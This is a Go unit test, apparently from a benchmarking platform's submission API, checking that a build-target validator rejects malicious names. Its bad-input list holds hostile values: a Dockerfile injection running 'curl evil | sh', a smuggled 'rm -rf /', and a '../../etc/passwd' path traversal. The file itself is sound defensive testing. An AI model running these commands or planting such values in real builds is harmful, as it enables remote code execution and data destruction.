// Package validator defines tests for target test.
//
// This file is part of the IICPC benchmarking platform and keeps its
// responsibilities local to the surrounding package. It should be read with
// the service-level design in design.md for broader operational context.
package validator

import (
	"testing"

	cerrs "github.com/iicpc/submission-api/internal/errors"
)

// TestValidateBuildTargetRejectsInjection performs the package-specific operation described by its name.
// It keeps validation, side effects, and returned values within this package's contract.
func TestValidateBuildTargetRejectsInjection(t *testing.T) {
	bad := []string{
		"app\"\nRUN curl evil | sh", // newline + quote -> inject Dockerfile directive
		"app; rm -rf /",             // shell metacharacters
		"../../etc/passwd",          // path traversal
		"a b",                       // whitespace
		"",                          // empty
	}
	for _, tgt := range bad {
		cfg := &BenchmarkConfig{Language: "go", Build: BuildSection{Type: "go", Target: tgt}}
		if err := validateBuildTarget(cfg, "go.mod", nil); err != cerrs.ErrInvalidBuildTarget {
			t.Errorf("target %q: got err=%v, want ErrInvalidBuildTarget", tgt, err)
		}
	}

	ok := &BenchmarkConfig{Language: "go", Build: BuildSection{Type: "go", Target: "my-app_1.bin"}}
	if err := validateBuildTarget(ok, "go.mod", nil); err != nil {
		t.Fatalf("clean Go target rejected: %v", err)
	}
}
